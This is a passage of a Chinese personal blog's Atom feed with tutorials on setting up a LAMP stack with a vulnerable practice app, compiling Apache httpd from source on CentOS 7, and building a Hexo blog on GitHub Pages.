</p><h3 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h3><pre><code>yum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml  </code></pre><p><img src="/img/181205/php01.png" alt="安装php"><br><code>php</code>安装完成<br>由于<code>PHP</code>是<code>Apache</code>的扩展，所以安装完<code>PHP</code>后需要重启<code>Apache</code>服务：  </p><pre><code>service httpd restart  </code></pre><p><img src="/img/181205/apache02.png" alt="Apache重启">  </p></li></ol><p>至此，<code>LAMP</code>环境安装完成</p><h1 id="搭建网站"><a href="#搭建网站" class="headerlink" title="搭建网站"></a>搭建网站</h1><ol><li>我们来导入网站源码测试一下，这次我们搭建一个漏洞环境，通过小黄鸭将文件导入<code>/var/www/html</code>目录中：<br><img src="/img/181205/cyberduck01.png" alt="cyberduck">  </li><li><p>修改文件夹权限，避免出现权限问题：  </p><pre><code>chown -R apache:apache /var/www/html  </code></pre></li><li><p>打开配置文件  </p><pre><code>vi /var/www/html/sys/config.php  </code></pre><p>修改账户密码为自己数据库的账户密码，保存退出即可<br><img src="/img/181205/change01.png" alt="修改账户密码">  </p></li><li>浏览器访问一下，出现如下错误：<br><img src="/img/181205/error02.png" alt="没有数据库"><br>这是因为我们数据库中没有<code>vauditdemo</code>这个数据库，进入<code>mysql</code>创建一个就可以了：<br><img src="/img/181205/mysql06.png" alt="进入mysql"><br><img src="/img/181205/create01.png" alt="创建数据库">  </li><li>浏览器再次访问：<br><img src="/img/181205/success01.png" alt="成功访问"><br>成功访问！  <blockquote><p>如果本文有任何错误，欢迎留言给我：<a href="https://github.com/clancyb00m/clancyb00m.github.io/issues" target="_blank" rel="noopener">Contact Me！</a></p></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h1&gt;&lt;p&gt;本次搭建用的是&lt;code&gt;centos6&lt;/code&gt;的虚拟机，是&lt;a href=&quot;https://www.cleverbao.blog&quot; 
      
    
    </summary>
    
    
      <category term="lamp,搭建" scheme="https://clancyb00m.github.io/tags/lamp-%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>源码安装httpd</title>
    <link href="https://clancyb00m.github.io/2018/12/04/%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85httpd/"/>
    <id>https://clancyb00m.github.io/2018/12/04/源码安装httpd/</id>
    <published>2018-12-04T13:45:41.000Z</published>
    <updated>2018-12-30T10:48:11.086Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文介绍了如何在linux（centos7）中通过httpd的源代码安装httpd服务  </p></blockquote><h1 id="ssh连接虚拟机"><a href="#ssh连接虚拟机" class="headerlink" title="ssh连接虚拟机"></a>ssh连接虚拟机</h1><blockquote><p>注：为什么要用ssh操作虚拟机，优点如下：  </p><blockquote><ol><li>界面美观  </li><li>可以进行复制粘贴操作  </li><li>安全</li><li>…  </li></ol></blockquote></blockquote><p>我使用的软件为：Termius<br><img src="/img/181204/termius01.png" alt="termius图标"><br>界面如图所示：<br><img src="/img/181204/termius02.png" alt="termius界面"><br>点击右下角<code>NEW HOST</code>，弹出如下界面：<br><img src="/img/181204/newhost01.png" alt="新建连接">  </p><blockquote><p>label：  起个别名<br>  address： 在虚拟机里面输入命令<code>ifconfig</code>查看自己的ip地址<br>  username：  用户名<br>  password：  密码  </p></blockquote><p>点击<code>save</code>保存，之后双击即可连接<br><img src="/img/181204/lianjie01.png" alt="连接"><br>如果双击后有提示框弹出，点击确定即可</p><h1 id="把httpd文件拷贝进centos7中"><a href="#把httpd文件拷贝进centos7中" class="headerlink" title="把httpd文件拷贝进centos7中"></a>把httpd文件拷贝进centos7中</h1><p>在Apache官网下载好源码后，使用这个软件进行真实机与虚拟机之间的文件拷贝<br><img src="/img/181204/copy01.png" alt="copy"><br>打开软件，点击左上角新建连接，填好内容后点击<code>连接</code>即可<br><img src="/img/181204/copy02.png" alt="cyberduck"><br><img src="/img/181204/copy03.png" alt="cyberduck02"><br>点击<code>允许</code><br>之后看到的内容和在虚拟机之中使用<code>ls</code>命令看到的内容是一样的<br><img src="/img/181204/copy04.png" alt="cyberduck03"><br><img src="/img/181204/copy05.png" alt="xuniji-ls"><br>把要安装的httpd的压缩文件直接拖入小黄鸭中，等待完成即可<br><img src="/img/181204/copy06.png" alt="cyberduck04">  </p><h1 id="开始在Termius中远程安装"><a href="#开始在Termius中远程安装" class="headerlink" title="开始在Termius中远程安装"></a>开始在Termius中远程安装</h1><p>在开始之前，需要进行一个很重要的操作，安装开发者工具集：</p><pre><code>yum groupinstall &quot;development tools&quot;  </code></pre><p>安装这个工具集的目的是为了能执行一些编译之类的命令，博主现在还不太懂<br><img src="/img/181204/developmenttools01.png" alt="development_tools01"><br><img src="/img/181204/developmenttools02.png" alt="development_tools02"><br><img src="/img/181204/developmenttools03.png" alt="development_tools03"><br>装完之后长这个样子：<br><img src="/img/181204/developmenttools04.png" alt="development_tools04"><br>之后开始安装：<br>解压：  </p><pre><code>tar zxvf httpd-2.4.37.tar.gz  </code></pre><p><img src="/img/181204/tar01.png" alt="tar01">  </p><p>进入到解压后的目录中，有一个INSTALL文件，通过小黄鸭（cyberduck）传到真实机上面通过编辑器打开：<br><img src="/img/181204/install01.png" alt="INSTALL"><br>红框中的内容为安装所需操作步骤，后面大写的<code>PERFIX</code>为路径，写上你想安装的路径即可  </p><h3 id="执行第一个命令"><a href="#执行第一个命令" class="headerlink" title="执行第一个命令"></a>执行第一个命令</h3><pre><code>./configure --prefix=/usr/local/apache2  </code></pre><p><code>/usr/local/apache2</code>为路径，自己想装在哪儿装哪儿就完事儿了<br>出错：<br><img src="/img/181204/error01.png" alt="error01"><br>APR未找到，那么我们来找一下  </p><pre><code>yum search apr  </code></pre><p><img src="/img/181204/apr01.png" alt="apr"><br>把里面所有文件装上即可，执行命令：  </p><pre><code>yum install apr-devel apr-util-devel apr-util apr -y  </code></pre><p>解释：通过<code>yum install</code>同时安装四个文件，文件不需要写全后缀，linux会自动补全，把所有类型的前缀都安装上，一共就这四种，最后的<code>-y</code>参数是在遇到让你输入<code>y/n</code>的时候自动输入<code>y</code><br><img src="/img/181204/apr02.png" alt="apr02"><br>解决掉错误，继续执行第一个命令：  </p><pre><code>./configure --prefix=/usr/local/apache2  </code></pre><p>再次出错：<br><img src="/img/181204/error02.png" alt="error02"><br>找一下pcre：</p><pre><code>yum search pcre  </code></pre><p><img src="/img/181204/pcre01.png" alt="pcre"><br>同上，执行命令：  </p><pre><code>yum install pcre-devel pcre2-devel pcre pcre2 -y</code></pre><p><img src="/img/181204/pcre02.png" alt="pcre01"><br>又解决一个错误，继续执行第一个命令：  </p><pre><code>./configure --prefix=/usr/local/apache2  </code></pre><p><img src="/img/181204/installed.png" alt="安装完成">  </p><h3 id="执行第二条命令"><a href="#执行第二条命令" class="headerlink" title="执行第二条命令"></a>执行第二条命令</h3><pre><code>make  </code></pre><p>输入后它会执行好多内容，等待一会儿即可<br><img src="/img/181204/make01.png" alt="make">   </p><h3 id="执行第三条命令"><a href="#执行第三条命令" class="headerlink" title="执行第三条命令"></a>执行第三条命令</h3><pre><code>make install  </code></pre><p>输入完执行，然后等待即可<br><img src="/img/181204/make02.png" alt="makeinstall"><br>到这里httpd就安装完成了</p><h3 id="执行第四条命令"><a href="#执行第四条命令" class="headerlink" title="执行第四条命令"></a>执行第四条命令</h3><pre><code>/usr/local/apache2/bin/apachectl start  </code></pre><p>解释：这条命令的作用是开启httpd服务<br>出现这个错误无关紧要，不用管：<br><img src="/img/181204/error03.png" alt="error03"><br>OK，成功开启</p><h1 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h1><p>首先需要关闭防火墙才能在局域网其他主机访问：  </p><pre><code>systemctl stop firewalld  </code></pre><p>之后在浏览器中输入<code>ip地址:80</code>即可访问</p><h1 id="放入站点文件"><a href="#放入站点文件" class="headerlink" title="放入站点文件"></a>放入站点文件</h1><p>把我的博客源码放入apache安装目录下的<code>htdocs</code>文件夹中，通过小黄鸭（cyberduck）直接进行拖拽即可<br><img src="/img/181204/cyberduck01.png" alt="htdocs"><br><img src="/img/181204/ok01.png" alt="ok">  </p><blockquote><p>如果本文有任何错误，欢迎留言给我：<a href="https://github.com/clancyb00m/clancyb00m.github.io/issues" target="_blank" rel="noopener">Contact Me！</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;本文介绍了如何在linux（centos7）中通过httpd的源代码安装httpd服务  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;ssh连接虚拟机&quot;&gt;&lt;a href=&quot;#ssh连接虚拟机&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
      <category term="源码安装,httpd" scheme="https://clancyb00m.github.io/tags/%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85-httpd/"/>
    
  </entry>
  
  <entry>
    <title>搭建GitHub博客</title>
    <link href="https://clancyb00m.github.io/2018/12/03/%E6%90%AD%E5%BB%BAGitHub%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/"/>
    <id>https://clancyb00m.github.io/2018/12/03/搭建GitHub博客系统/</id>
    <published>2018-12-03T13:45:41.000Z</published>
    <updated>2018-12-30T10:48:04.839Z</updated>
    
    <content type="html"><![CDATA[<p>注：本文操作系统环境为windows</p><h1 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h1><p>Nodejs : 官网下载就完事儿了，默认安装<br>Git : 官网下载，安装的时候勾选上可以在cmd中运行即可  </p><h1 id="文本解释器"><a href="#文本解释器" class="headerlink" title="文本解释器"></a>文本解释器</h1><p>Visual Studio Code(推荐)或者Sublime Text  </p><h1 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h1><p><img src="/img/hexo01.png" alt="hexo简介"><br><code>win+R</code>打开输入<code>cmd</code>，执行命令:  </p><pre><code>npm install -g hexo-cli  </code></pre><p>目的：安装hexo<br><img src="/img/hexo02.png" alt="hexo安装">  </p><h1 id="新建文件夹存储此项目"><a href="#新建文件夹存储此项目" class="headerlink" title="新建文件夹存储此项目"></a>新建文件夹存储此项目</h1><p>我的文件夹命名为<code>myblog</code>，在文件夹内打开cmd窗口，执行命令： </p><pre><code>hexo init .</code></pre><p>目的：初始化</p><h1 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h1><p>把<code>myblog</code>文件夹用visual studio code打开，打开<code>_config.yml</code>配置文件<br><img src="/img/config01.png" alt="config文件"><br>修改红框中的内容，注意：属性与值之间有空格，例：</p><pre><code>language: ZH-CN</code></pre><blockquote><p>url后续再做更改  </p></blockquote><h1 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h1><p>创建并登录GitHub，之后点击右上角<code>+</code>号，新建一个存储库<code>New repository</code><br><img src="/img/github01.png" alt="创建存储库"><br><img src="/img/github02.png" alt="创建存储库02"><br>之后点击<code>Create repository</code>就完事儿了<br>初始界面大致长这个样子：<br><img src="/img/github03.png" alt="初始界面"><br>选择<code>create new file</code>新建一个文件<br><img src="/img/github04.png" alt="新建文件">  </p><h1 id="下载静态文件并且完成本地访问"><a href="#下载静态文件并且完成本地访问" class="headerlink" title="下载静态文件并且完成本地访问"></a>下载静态文件并且完成本地访问</h1><p>由于在github中直接新建文件存在各种局限性，所以通过本地写会更方便一些<br>在<code>myblog</code>文件夹中打开cmd命令行窗口，执行命令：  </p><pre><code>hexo generate  </code></pre><p>目的：更新静态文件，hexo程序直接帮你写好初始化静态网页<br><img src="/img/hexo03.png" alt="更新网页源代码"><br>本地访问：  </p><blockquote><p>本地访问可以方便的看到文件在浏览器中的具体样子，便于修改  </p></blockquote><p><img src="/img/hexoserver.png" alt="本地开启服务器">  </p><h1 id="同步本地文件至github"><a href="#同步本地文件至github" class="headerlink" title="同步本地文件至github"></a>同步本地文件至github</h1><p>打开<code>github desktop</code>并登录<br>选择<code>clone a repository</code><br><img src="/img/clone01.png" alt="克隆项目"><br>选择存储库，设置本地路径，点击<code>clone</code><br><img src="/img/clone02.png" alt="克隆项目02"><br>把写好的文件放入上一步设置的路径中,打开<code>github desktop</code><br><img src="/img/upload01.png" alt="上传同步"><br>选择要上传的文件，点击<code>commit to master</code>进行上传<br>同步：<br><img src="/img/upload02.png" alt="同步">  </p><h1 id="主题更改"><a href="#主题更改" class="headerlink" title="主题更改"></a>主题更改</h1><p>找主题：<a href="https://hexo.io/themes" target="_blank" rel="noopener">themes</a><br>下载主题：  </p><pre><code>1.  复制文件路径：  </code></pre><p><img src="/img/copy01.png" alt="复制路径"><br>在<code>myblog/themes</code>文件夹中打开cmd窗口,执行命令：  </p><pre><code>git clone 主题路径</code></pre><p>在<code>myblog</code>文件夹中用编辑器打开<code>_config.yml</code>，修改<code>theme</code>值为你的主题名<br><img src="/img/themes01.png" alt="themes"></p><h1 id="清空旧网站文件，生成新网站文件"><a href="#清空旧网站文件，生成新网站文件" class="headerlink" title="清空旧网站文件，生成新网站文件"></a>清空旧网站文件，生成新网站文件</h1><p>在<code>myblog</code>文件中打开cmd命令行窗口，执行命令：  </p><pre><code>hexo clean  </code></pre><p><img src="/img/clean01.png" alt="clean"><br>目的：清除旧网站文件（public文件夹）  </p><pre><code>hexo generate</code></pre><p><img src="/img/hexo03.png" alt="generate"><br>目的：生成新网站文件（public文件夹）<br>如果想在本地访问，可执行命令：  </p><pre><code>hexo server  </code></pre><p><img src="/img/server01.png" alt="server"><br>目的：开启本地服务器<br>然后在浏览器地址栏输入<code>localhost:4000</code>即可  </p><h1 id="上传主题"><a href="#上传主题" class="headerlink" title="上传主题"></a>上传主题</h1><p>在github存储库的文件夹中删除所有文件（.gt隐藏文件不要删），把<code>myblog</code>文件夹中的<code>public</code>文件夹中的所有内容复制到github存储库文件夹中<br>在<code>github desktop</code>中添加摘要和描述，点击<code>commit to master</code>即可<br>同步：<br><img src="/img/upload02.png" alt="同步"></p><h1 id="如何在博客里面写文章"><a href="#如何在博客里面写文章" class="headerlink" title="如何在博客里面写文章"></a>如何在博客里面写文章</h1><p>在<code>myblog</code>文件夹中打开cmd命令行窗口，执行命令：  </p><pre><code>hexo new &quot;filename&quot;  </code></pre><p>屏幕会输出文件保存路径<br><img src="/img/hexonew01.png" alt="新建文件"><br>在<code>myblog</code>文件夹中打开vscode，打开上述图片位置，写入内容，保存即可<br>更新网站文件：<br>在<code>myblog</code>文件夹中打开cmd，执行命令：</p><pre><code>hexo generate</code></pre><p>目的：更新本地public文件夹<br><img src="/img/hexo03.png" alt="generate"><br>把<code>myblog/public</code>文件夹中的内容复制到github存储库的本地文件夹中，通过<code>github desktop</code>上传并同步即可  </p><h1 id="错误说明"><a href="#错误说明" class="headerlink" title="错误说明"></a>错误说明</h1><p><img src="/img/error01.png" alt="error01"><br>原因：<code>github desktop</code>的本地存储库文件夹中的.gt隐藏文件不能删除  </p><blockquote><p>如果本文有任何错误，欢迎留言给我：<a href="https://github.com/clancyb00m/clancyb00m.github.io/issues" target="_blank" rel="noopener">Contact Me！</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;注：本文操作系统环境为windows&lt;/p&gt;
&lt;h1 id=&quot;安装前提&quot;&gt;&lt;a href=&quot;#安装前提&quot; class=&quot;headerlink&quot; title=&quot;安装前提&quot;&gt;&lt;/a&gt;安装前提&lt;/h1&gt;&lt;p&gt;Nodejs : 官网下载就完事儿了，默认安装&lt;br&gt;Git : 官网下
      
    
    </summary>
    
    
      <category term="GitHub,博客,搭建" scheme="https://clancyb00m.github.io/tags/GitHub-%E5%8D%9A%E5%AE%A2-%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
</feed>
